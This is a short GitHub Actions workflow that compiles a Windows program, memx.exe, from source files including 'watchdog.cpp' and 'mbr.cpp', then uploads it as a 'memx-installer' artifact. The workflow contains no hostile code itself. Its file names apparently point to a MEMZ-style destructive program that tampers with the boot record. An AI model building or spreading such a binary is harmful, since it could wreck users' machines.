name: Build MEMX

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  build:
    runs-on: windows-2022

    steps:
      - uses: actions/checkout@v4

      - name: Setup MSVC
        uses: ilammy/msvc-dev-cmd@v1

      - name: Build memx.exe
        shell: cmd
        run: |
          cl /EHsc /std:c++17 main.cpp effects.cpp watchdog.cpp mbr.cpp ^
          /link user32.lib gdi32.lib winmm.lib shell32.lib ole32.lib uuid.lib advapi32.lib ^
          /SUBSYSTEM:WINDOWS /OUT:memx.exe
          dir memx.exe

      - name: Check file size
        shell: bash
        run: |
          ls -la memx.exe
          if [ ! -f memx.exe ] || [ $(stat -c%s memx.exe) -lt 10000 ]; then
            echo "❌ memx.exe слишком маленький или не существует!"
            exit 1
          fi

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: memx-installer
          path: memx.exe
          retention-days: 30